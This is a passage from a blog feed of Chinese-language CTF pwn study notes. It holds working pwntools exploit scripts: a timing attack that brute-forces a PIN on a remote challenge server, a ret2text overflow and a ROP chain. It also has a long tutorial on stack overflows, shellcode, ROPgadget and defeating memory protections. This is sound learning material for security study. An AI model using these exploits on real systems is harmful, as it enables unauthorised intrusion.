get_sb():    return libc_base + libc.sym[&#39;system&#39;], libc_base + next(libc.search(b&#39;/bin/sh\x00&#39;))def getpin(pin):    subtime = -1    res =&#39;&#39;    for c in a:        pin_o = pin+c+&#39;0&#39;*(7-len(pin))        sum=0        for _ in range(10):            ru(&#39;&gt;&#39;)            sl(b&#39;3&#39;)            ru(b&quot;PIN code: &quot;)            start=time.time()            sl(pin_o)            rev=ru(b&#39;\n&#39;)            if b&quot;Wrong PIN code&quot; in rev:                pass            else:                print(pin_0)                break            end=time.time()            sum+=(end-start)        print(cur,sum)        avgtime=sum        if(avgtime&gt;subtime):            subtime=avgtime            res=c    return resa=&#39;0123456789&#39;p= remote(&quot;123.56.238.150&quot;,45118)pin=&#39;&#39;for i in range(8):    pin+=getpin(pin)    print(&quot;PIN:&quot;,pin)ru(b&#39;&gt;&#39;)sl(b&#39;2&#39;)ru(b&#39;PASSWD&#39;)sl(b&quot;123456&quot;)ru(b&#39;$&#39;)sl(b&quot;cat flag&quot;)p.interactive()#flag&#123;d39a1013-e066-4d64-8558-4a5855fb7303&#125;   pin code : 54730891            </code></pre><h3 id="【SSCTF】"><a href="#【SSCTF】" class="headerlink" title="【SSCTF】"></a>【SSCTF】</h3><p>pwn_stack<br>（1）checksec </p><p>​      <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604234931863.png" alt="image-20230604234931863"></p><p>​       只开了NX好办捏😀<br>（2） 进IDA<br>   <img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235352214.png" alt="image-20230604235352214"></p><p>很明显的函数提示 先看看主函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235530821.png" alt="image-20230604235530821"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230604235541815.png" alt="image-20230604235541815"></p><p>buf溢出但被打印出 可忽视（此处知识点较为模糊 还需进一步进行研究解读）v1处溢出<br>查看偏移位0x98 再回到shell函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230605000024030.png" alt="image-20230605000024030"></p><p>没什么好说直接开整 典型ret2text<br>exp：</p><pre><code class="python">from pwn import *p = process(&quot;./1&quot;)#太懒了给文件名改名了😜bin_sh = 0x0400831 sys_addr = 0x40083D#p.recvuntil(&quot;What&#39;s your name?&quot;)payload =b&#39;A&#39;* (0x90 + 8) + p64(bin_sh)  + p64(sys_addr)#p.recvuntil(&#39;\n&#39;)p.sendline(&#39;yub&#39;)p.recvuntil(&quot;How old are you?&quot;)p.sendline(payload)p.interactive()</code></pre><p>从函数头返回注意栈对齐问题 +1跳过push rbp的8字节对齐</p><h3 id="【Black-Rop】"><a href="#【Black-Rop】" class="headerlink" title="【Black Rop】"></a>【Black Rop】</h3><p>（1）checksec<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171541372.png" alt="image-20230629171541372"></p><p>（2）IDA<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171837565.png" alt="image-20230629171837565"><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230629171906502.png" alt="image-20230629171906502"></p><p>常规溢出捏~<br>系统没给出system和”&#x2F;bin&#x2F;sh” 所以构造rop</p><pre><code class="python">from pwn import *p = process(&#39;./rop&#39;) pop4 = 0x080493e8 # pop ebx ; pop esi ; pop edi ; pop ebp ; retpop1 = 0x0804901e # pop ebx ; retpop2 = 0x080493ea # pop edi ; pop ebp ; retpop3 = 0x080493e9 # pop esi ; pop edi ; pop ebp ; ret payload = b&#39;A&#39;*0x12+ flat(0,0x80492ce,0x8049293, pop1, 0x804a033, 0x80492e8, pop1, 0xbae, 0x804930b, pop2, 0x62023 , 0xBF1212, 0x80491c2)p.sendlineafter(b&quot;check your identity and read the flag.\n&quot;, payload)p.recvline()p.interactive()</code></pre>]]></content>
      
      
      <categories>
          
          <category> 二进制安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn,知识碎片 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn探索--大杂烩</title>
      <link href="/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/"/>
      <url>/2023/09/01/%E3%80%90%E8%A7%A3%E5%AF%86%E7%B3%BB%E5%88%97%E3%80%91pwn%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>pwn的核心：二进制漏洞的利用和挖掘<br>研究层次：编译成机器码的二进制程序的漏洞二进制程序实际为可执行文件<br>linux系统下ELF&#x3D;windows系统下EXE文件<br><strong>一次简单的hack</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307002535708.png" alt="image-20230307002535708"></p><p>CTF中pwn攻击脚本思路：</p><p>1.pwn程序&#x2F;服务器（必不可少滴）开端——&gt;from pwn import*<br>2.使用python中pwn tools用remote函数打开远端需要攻击的服务器端口<br>3.进行链接<br>4.构造恶意数据<br>5.发送恶意数据<br>6.使用交互函数（io.interactive（））获取flag</p><h5 id="程序的编译与链接"><a href="#程序的编译与链接" class="headerlink" title="程序的编译与链接"></a><strong>程序的编译与链接</strong></h5><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206225702913.png" alt="image-20230206225702913"></p><p>linux借助文件头进行识别!（用vim打开可查看源码–&gt;%!xxd可查看十六进制表示）<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206230237084.png" alt="image-20230206230237084"></p><h5 id="编译过程"><a href="#编译过程" class="headerlink" title="编译过程"></a><strong>编译过程</strong></h5><p>ls指list file即列出文件；可用ll查看文件详细内容。<br>gcc兼具编译器和汇编器的功能。<br>ctrl+alt+t 启动shell</p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206231832031.png" alt="image-20230206231832031" style="zoom:150%;" /><p>Linux环境下执行可执行文件<br>!xdd%-r 还原文件<br>rm a.out 删除<br>.&#x2F;a.out 是linux&#x2F;unix环境下gcc编译源代码(c&#x2F;c++)并连来接产生的默认执行文件名。.&#x2F;a.out表示当前目录下的a.out文件。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206232441503.png" alt="image-20230206232441503"></p><p>链接<br>动态链接：printf的代码到动态链接库里；<br>静态链接：printf中的代码直接写好在对应文件中<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230206235815274.png" alt="image-20230206235815274"><br><strong>文件权限不够时如何处理得到shell</strong><br>下以python3为例</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208112405419.png" alt="image-20230208112405419"></p><p>mv命令：用户可以使用mv命令来为文件或目录改名或将文件由一个目录移入另一个目录中。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208141609541.png" alt="image-20230208141609541"></p><p>段用来标注进程、印象代码段权限。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208142032344.png" alt="image-20230208142032344"></p><p>.&#x2F;时才被读入内存<br>cache越大（M存储），cpu速度越快。</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208151435139.png" alt="image-20230208151435139"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208152953051.png" alt="image-20230208152953051"></p><p>实模式下运行（易受到攻击）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161344724.png" alt="image-20230208161344724"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208161302543.png" alt="image-20230208161302543"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162239886.png" alt="image-20230208162239886"></p><p>十六进制转二进制</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208162610999.png" alt="image-20230208162610999"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164349628.png" alt="image-20230208164349628"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208164650781.png" alt="image-20230208164650781"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170556987.png" alt="image-20230208170556987"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208170832516.png" alt="image-20230208170832516"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208172413117.png" alt="image-20230208172413117"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230208173923251.png" alt="image-20230208173923251"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230208173818672.png" alt="image-20230208173818672"></p><p>C语言函数栈帧<br>栈帧：记录一个函数此时的状态信息<br>函数的栈底由EBP或RBP保存<br>函数的栈顶由ESP或RSP保存</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209094759828.png" alt="image-20230209094759828"></p><p>32位视图<br>子函数所用参数保存在父函数栈帧的末尾<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209100855874.png" alt="image-20230209100855874"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209101728223.png" alt="image-20230209101728223"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102340553.png" alt="image-20230209102340553"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209102615915.png" alt="image-20230209102615915"></p><p>push ebp保持父函数栈底的空间<br>sum函数调用完后需要恢复main函数的信息，即在调用sum函数前需将mian函数栈底压入。<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209103333679.png" alt="image-20230209103333679"></p><p>栈的栈顶一定是当前执行函数所属的栈帧。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209104000217.png" alt="image-20230209104000217"></p><p>无需舍弃只需标记为不需使用值即可——&gt;扩大esp到ebp处（避开局部变量存储空间）<br><strong>注意：此过程中变化为对应值的地址存储在ebp中——&gt;对应值存储在ebp中</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209105139584.png" alt="image-20230209105139584"></p><p>ebp减小一个字长；esp加一个字长。通过return指令将return address弹出保存在eap（指令寄存器）中<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230209110221569.png" alt="image-20230209110221569"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209110919361.png" alt="image-20230209110919361"></p><p>call指令自带保存返回地址。<br>leave：将esp ebp放于同一位置后popebp。<br>pop总是将esp指向的值对应的1字长数据传入到目标位置</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230209112610898.png" alt="image-20230209112610898"></p><p><strong>缓冲区溢出中</strong> <strong>栈溢出控制程序流核心：</strong><br>当子函数返回父函数时会将<em>Ruturn Adress</em>中的值返回到PC寄存器eip（32位）中，当eip中值写入目标值的地址，既可<em>完成程序执行流的控制</em>。</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230216235806404.png" alt="image-20230216235806404"></p><p>举例演示：<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219153353227.png" alt="image-20230219153353227"></p><pre><code class="c">#include&lt;stdio.h&gt;int main()&#123;   char str[8];   read (0,str,24);   retrun 0;&#125;</code></pre><p>此时产生segmentation fault（段错误）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219154052743.png" alt="image-20230219154052743"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230219154202756.png" alt="image-20230219154202756"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219161736349.png" alt="image-20230219161736349"></p><p>安全保护措施（拿到二进制文件之后先检查）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230219165330509.png"></p><p><strong>注意</strong>：<em>出现gets函数必有栈溢出！</em>strart函数无法F5（编写时已用汇编代码实现）<br>vulnerable——&gt;可怜受害者函数捏~</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002608337.png" alt="image-20230221002608337"></p><p>ctrl+A后：可看C和汇编比较<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221002832185.png" alt="image-20230221002832185"></p><p>ctrl+s–&gt;保存<br>(Fn+)shift+F12-&gt;打开字符串界面（ASCII范围内的字符串）<br>打开目标文件得关键句逐层剖析反汇编get完整main体-&gt;end<br>pwntools:nc转到问题变量本体<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160248520.png" alt="image-20230221160248520"></p><p>CTF建议：pip2+pip3均安装<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221160924626.png" alt="image-20230221160924626">+<strong>代理地址可进行安装</strong>vi</p><p>拿到题目——&gt;先拿到本地shell——&gt;pwntools攻击——&gt;io本地切换为远程（脚本不变）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221162513214.png" alt="image-20230221162513214"></p><p>链接：process()-&gt;本地；remote（）—&gt;远程<br>函数：<br>io.recvline() 接收一行字符串；           io.recv（）接收多行字符串<br>io.send() <strong>注意：函数内部只能为字节流（即为二进制表示）</strong><br>io.send(p32(0)+b” ╰(<em>°▽°</em>)╯——&gt;表示bite对象”)<br>io.sendline()——&gt;一直读取直到\0或\n;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165139013.png" alt="image-20230221165139013"></p><p>nc tools地址 ❗❗❗flag隐藏在其中❗❗❗<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221165745894.png" alt="image-20230221165745894"></p><p>python3开  remote(“ip”,端口)<br>特殊控制符\r——&gt; 输出当前行后持续进行清空<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171244473.png" alt="image-20230221171244473"></p><p>base64工具（pwntools工具）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221171442165.png" alt="image-20230221171442165"></p><p>❗BASE64:包含大写字母（A-Z）,小写字母（a-z），数字（0-9）以及+&#x2F; 一般带&#x3D;&#x3D;<br>❗BASE32:只有大写字母（A-Z）和数字234567 一般带&#x3D;&#x3D;&#x3D;<br>❗BASE16即为16进制<br><strong>当ASCll用Base加密达不到所对应的位数的时候用&#x3D;号补齐</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230221234220854.png" alt="image-20230221234220854"></p><blockquote><p>cd “你想要进的目录” &#x2F;&#x2F;当目录名称中含有空格、中文或其它<a href="https://baike.baidu.com/item/%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6/112715?fromModule=lemma_inlink">特殊字符</a>时请用<a href="https://baike.baidu.com/item/%E5%8F%8C%E5%BC%95%E5%8F%B7/10758658?fromModule=lemma_inlink">双引号</a>包括</p><p>以下是最常用的几个目录的写法：</p><p>&#x2F; 代表<a href="https://baike.baidu.com/item/%E6%A0%B9%E7%9B%AE%E5%BD%95/6061330?fromModule=lemma_inlink">根目录</a></p><p>. 当前目录</p><p>.. 上级目录</p><p>~ 当前用户的默认工作目录</p><p>目录可以省略不写， 与cd ~ 有相同的效果</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222002023021.png" alt="image-20230222002023021"></p><p>关闭标准输入输出的缓冲区 使得其中内容可以立马显示出来 ctrl+#调小字体<br>下断点方式：pwndbg中b *+一个地址 或者b + 一个函数<br>先下断点后run  gdb中运行输入首字母即可  例：n——&gt;步过    s——&gt;standin<br>下断点：b（breakpoint）  * +地址&#x2F;函数<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230222191527599.png" alt="image-20230222191527599"></p><p>此时可修改部分为buffer（8字节）即eax到ebp部分（16大小）覆盖时需+4（覆盖ebp）<br>持续向下写<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075312799.png" alt="image-20230223075312799">找到后门函数system 注：可不是次次这么便宜的哦🤣<br>syetem返回字符串&#x3D;在shell中直接执行字符串 pwd：打印工作目录<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223075541707.png" alt="image-20230223075541707"></p><p>使得vualable return到shell即可<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223103831511"></p><p>p（pack）对数据进行打包变为字符型数据 ； 例：p32（0x8048522）打包为32bite位字符</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223104016114.png" alt="image-20230223104016114"></p><p>gcc：Linux环境下的一款编译器。<br>ctrl+d 退出python交互环境!<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112513513.png" alt="image-20230223112513513"><br>bss默认栈可执行<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230411152517155.png" alt="image-20230411152517155"><br>关闭随机化（ASLR）</p><pre><code>-fro-stack-protector 关闭canary-z exexstack 打开栈的可执行权限-no-pie 关闭pie（程序编译时打开pie 将地址随机化为无关代码 即随机化elf文件）-g 带上调试信息 调试时可以看见源代码（ret2stack.c未删除情况下）-o 输出目标文件</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412200146471.png" alt="image-20230412200146471">chmod +x 给权限<br>shellcode(偏移+返回地址)</p><p>地址空间随机化&lt;——操作系统实现  可输入0检查ASLR是否关闭<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223115046186.png" alt="image-20230223115046186"></p><p>动态链接库看为1 地址随机分配 栈同（偏移值随机地址未知）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230223232443609"></p><p>bss用来存放全局变量  可读可写可执行 shellcode返回到bss<br>shellcode返回栈区由于aslr的保护不可得到所需栈地址，返回bss即可</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230224081202824.png" alt="image-20230224081202824"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224081246465.png" alt="image-20230224081246465"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230223112708517.png" alt="image-20230223112708517"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230223113034773.png" alt="image-20230223113034773"></p><p>在pwn里，保护一共是四种分别是RELRO、Stack、NX、PIE。<br>1.RELRO（ReLocation Read-Only）：分为两种情况，第一种情况是Partial RELRO，这种情况是部分开启堆栈地址随机化，got表可写，第二种，Full RELRO是全部开启，got表不可写，Got表是全局偏移表，里面包含的是外部定义的符号相应的条目的数据段中，PLT表，是过程链接表&#x2F;内部函数表，linux延迟绑定，但是最后还是要连接到Got，PLT表只是为一个过渡的作用。<br>2.Stack（canary）：这个保护其实就是在你调用的函数的时候，在栈帧中插入一个随机数，在函数执行完成返回之前，来校验随机数是否被改变，来判断是否被栈溢出，这个我们也俗称为canary（金丝雀），栈保护技术。<br>3.NX（no execute）：为栈不可知性，也就是栈上的数据不可以当作代码区执行的作用,NX打开说明栈上已经给出全部可用的system（）、”&#x2F;bin&#x2F;sh”，不可自行写入。<br>4.PIE（Position Independent Executable）：PIE的中文叫做，地址无关可执行文件，是针对.text（代码段），.data（数据段），.bss（未初始化全局变量段）来做的保护，正常每一次加载程序，加载地址是固定的，但是PIE保护开启，每次程序启动的时候都会变换加载地址。</p><p>context.arch &#x3D; ‘“amch64”——&gt;将位机器码转为64位<br>vmmap显示虚拟内存的分布<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230224125905589.png" alt="image-20230224125905589"></p><p>32位 1字长&#x3D;4bite 64位 1字长 &#x3D; 8bite push栈向上增长pop向下增长（减小）<br>leave执行：1.将esp归位至ebp位  2.pop ebp将previous ebp中的值存放到ebp中 3.ebp返回父函数栈底<br>esp自动+1字长（执行pop）<br>return的作用：将当前函数栈顶中的值pop返回到eip寄存器中 程序正在执行的地址变成return address<br>return address中的值存放到eip中 eip返回到上一个函数</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226153916098.png" alt="image-20230226153916098"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226154515139.png" alt="image-20230226154515139"></p><p>pwndbg的好处捏~<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226155524945.png" alt="image-20230226155524945"><br>自动编写payload（默认结果为x86下32bite大小) print（shellcraft.sh（) )</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230226155734820.png" alt="image-20230226155734820"></p><p>asm将汇编码转变为机器码后发送至远程内存虚拟空间的某个位置<br>l.just(x，y)从左向右，左端数据不变对右边的数据不断进行填充 x：填充的数据长度 y：填充内容<br>cat.flag.txt 得到flag内容<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230226162609326.png" alt="image-20230226162609326"></p><p>关闭aslr指令。<br><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230306232744633.png" alt="image-20230306232744633"></p><p>关闭canary（堆栈共享库）pie(共享库编译时 将elf文件本体的载入地址随机化)  - 0输出目标文件<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230307000253788.png" alt="image-20230307000253788"></p><p>给可执行文件权限 .&#x2F;运行shell<br>ctrl+c -&gt;向当前执行进程发送一个终止信号（复制ctrl+shift+c）<br>crl+d 退出当前shell<br>context.arch &#x3D; “amd64”(告诉py系统架构【系统位数】)<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230310080407959.png" alt="image-20230310080407959">关闭标准缓冲区得到输出值</p><p>system()函数调用&#x2F;bin&#x2F;sh来执行参数指定的命令，&#x2F;bin&#x2F;sh 一般是一个软连接，指向某个具体的shell，比如bash，-c选项是告诉shell从字符串command中读取命令； 在该command执行期间，SIGCHLD是被阻塞的，好比在说：hi，内核，这会不要给我送SIGCHLD信号，等我忙完再说； 在该command执行期间，SIGINT和SIGQUIT是被忽略的，意思是进程收到这两个信号后没有任何动作</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230325231231643.png" alt="image-20230325231231643"></p><p>动态链接库本身就是一个可执行文件。<br>my_puts函数输出过程（无各栈保护可考虑rop）<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153211276.png" alt="image-20230409153211276"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409153739815.png" alt="image-20230409153739815"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230409163357731.png" alt="image-20230409163357731"></p><p>ROPgadget 获取text段所需汇编代码（ret——&gt;将栈中信息弹到eip中） eax、ebx优先【ROP总会至溢出retaddr后】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230409171200929"></p><p>异或（xor）常用于清空缓冲区<br>flat()函数 接收一个列表参数将列表中的每一项都转为字节型数据并且自动把不足一字节数据进行填补</p><pre><code>io = flat（[b&#39;A&#39;*112,pop_eax_ret,0xb,pop_eax_ecx_ebx_ret,0,0,bin_sh,int_80h]）</code></pre><p>grep功能：对输入行中含有用户自定参数的行进行全部输出</p><pre><code>ROPgadget --binary ret2syscall --only &quot;pop|ret&quot; | head</code></pre><p>sos 救大命踩坑！！！输入格式我哭死&#x2F;(ㄒoㄒ)&#x2F;<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410210009493.png" alt="image-20230410210009493"></p><pre><code>ROPgadget  --binary ret2syscall --only &quot;pop|ret&quot; | grep eax</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230410194103144.png" alt="image-20230410194103144"></p><pre><code>ROPgadget --binary 文件名 --only &quot;int&quot;(执行系统调用 当为0x80时中断结束0x80表示进行系统调用的call)</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230410201002577.png" alt="image-20230410201002577"></p><p>python3中必须用b转换为字节流型数据 generator转换器 next（）函数（前+hex转为十六进制）！！转化为十进制数据ww其实不如ROPgadget来的方便喽（目前个人觉得）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412210903759.png"></p><pre><code>ROPgadget --binary 文件名 --string &#39;/bin/sh&#39; (查询后门地址)</code></pre><p>ret2text ret2shellcode 均直接含有后门函数 ret2text 自接收一串base64解码得flag ret2shellcode</p><pre><code>sys_execve() -&gt;0xb</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412204604894.png" alt="image-20230412204604894"><br>内核系统调用函数名                            用户调用代号<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214823229.png" alt="image-20230412214823229"></p><p>静态链接和动态链接<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412214936627.png" alt="image-20230412214936627"></p><p>区别：<img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230412215132315.png" alt="image-20230412215132315"></p><p>静态链接方便找到gadget：静态链接将库函数全部写入elf文件本身 容易用指针片段构成攻击流<br>动态链接只是做了标记，用即拿（别处借xx例：printf调用vprintf【2000多行 还要再调吓人的嘞】）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230413185604877.png" alt="image-20230413185604877"></p><p>静态链接在链接时进行 动态链接在装载时进行</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414210446532.png" alt="image-20230414210446532"></p><p>puts函数动态链接在可执行段code载入（只为虚拟内存地址【libc全载入】但并不知真实地址）在运行时可找此时plt结解析使得puts内容填入data段got.plt文件【plt在代码段 got在数据段】</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414212714060.png" alt="image-20230414212714060"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214750326.png" alt="image-20230414214750326"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414214800705.png" alt="image-20230414214800705"></p><pre><code>gcc -fro-pie -g -m32 -o link 动态链接文件名(32位)gcc -fro-pie -g -0 link 动态链接文件名（64位）</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png"></p><p>查看plt  x 地址——&gt;以二进制形式查看</p><pre><code>pwndbg disass 地址-&gt;反汇编</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230414215358915.png" alt="image-20230414222605298"></p><p>info b 查看断点信息  b 行号可下断点（含C代码情况下） d 行号可删除断点【无C语言 b 地址下断点】<br>c 遇到下一个断点&#x2F;输入（puts）&#x2F;程序中断 </p><pre><code>b main == start 【若无main函数则停在程序入口第一条（start才为程序入口）】s 步进 n 步过backtrace 函数调用栈【呈现祖孙关系（😀）】return 直接回到main函数</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415092539078.png" alt="image-20230415092539078"></p><pre><code>void secure()&#123;  unsigned int v0; // eax  int input; // [esp+18h] [ebp-10h] BYREF  int secretcode; // [esp+1Ch] [ebp-Ch]  v0 = time(0);  srand(v0);  secretcode = rand();  __isoc99_scanf(&quot;%d&quot;, &amp;input);  if ( input == secretcode )    system(&quot;shell!?&quot;);&#125; //此处system函数虽无后门 但提供system plt表象 使得在text中可自动将执行流拉入libc段</code></pre><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230418124940615"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415100827595.png" alt="image-20230415100827595"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415101652128.png" alt="image-20230415101652128"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415112529947.png" alt="image-20230415112529947"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230415114324006.png" alt="image-20230415114324006"></p><p>amd64向下兼容x86故含有eax<br>函数<strong>调用栈</strong>地址从高地址向低地址增长【更好的利用虚拟内存空间】（寄存器为低地址向高地址增长即先入后出）</p><p>【后续画图补充 好懒（我真该死啊 忘了的时候就知道动手记录了😶）】<strong>赎罪录：</strong></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418130159741.png" alt="image-20230418130159741"></p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418132149276.png" alt="image-20230418132149276">画的太撇了（笑）</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418132737386.png" alt="image-20230418132737386"></p><p>执行完调用返回dyntest（均在内存空间中）</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418133451380.png" alt="image-20230418133451380"></p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418205450196.png" alt="image-20230418205450196"></p><p><strong>【调用流程两点需注意】</strong>（x86例）</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230418212246848.png" alt="image-20230418212246848"></p><p>father中也含有子函数所需arg<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230418213125953.png" alt="image-20230418213125953"></p><p>查表易犯错误（直接调got）</p><pre><code>ret = system@got(❌)</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419201116801.png" alt="image-20230419201116801"></p><pre><code>elf = ELF(&quot;./dyntest&quot;)[  文件形式及保护]elf.got[&quot;puts&quot;]//获取函数表象地址hex(elf.got[&quot;puts&quot;])//获取函数真实地址</code></pre><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20230419203107813.png" 